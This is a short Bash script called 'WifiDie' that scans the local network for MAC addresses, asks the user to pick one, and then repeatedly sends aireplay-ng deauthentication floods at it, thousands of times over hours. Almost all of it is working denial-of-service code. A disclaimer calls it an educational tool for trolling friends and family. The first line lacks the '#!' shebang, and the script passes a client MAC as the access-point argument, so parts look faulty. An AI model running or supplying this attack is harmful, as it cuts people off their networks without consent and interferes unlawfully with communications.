/bin/bash
# Developer: SirCryptic | NullSecurityTeam | https://github.com/SirCryptic
# Info: 1.1 WifiDie | Original Repo ( https://github.com/SirCryptic/script-dumping-ground/blob/main/bash/wifidie.sh )
# PLEASE USE RESPONSIBLY I AM NOT LIABLE FOR YOUR MISUSE OF THIS SCRIPT, IT IS JUST A MERE EDUCATIONAL TOOL INTENDED TO TROLL FRIENDS AND FAMILY ON THE SAME NETWORK.

function get_target_mac() {
    echo "Searching for nearby MAC addresses..."
    local macs=($(arp-scan --localnet | grep -Eo "([a-f0-9]{2}:){5}[a-f0-9]{2}"))
    local count=1
    for mac in "${macs[@]}"; do
        echo "$count) $mac"
        count=$((count + 1))
    done
    echo "Please select a target MAC address:"
    read target_mac_index
    target_mac=${macs[$((target_mac_index - 1))]}
    echo "Selected MAC address: $target_mac"
}

get_target_mac

for i in {1..5000}
do
    aireplay-ng -deauth 1000 -a $target_mac mon1
    sleep 60s
done
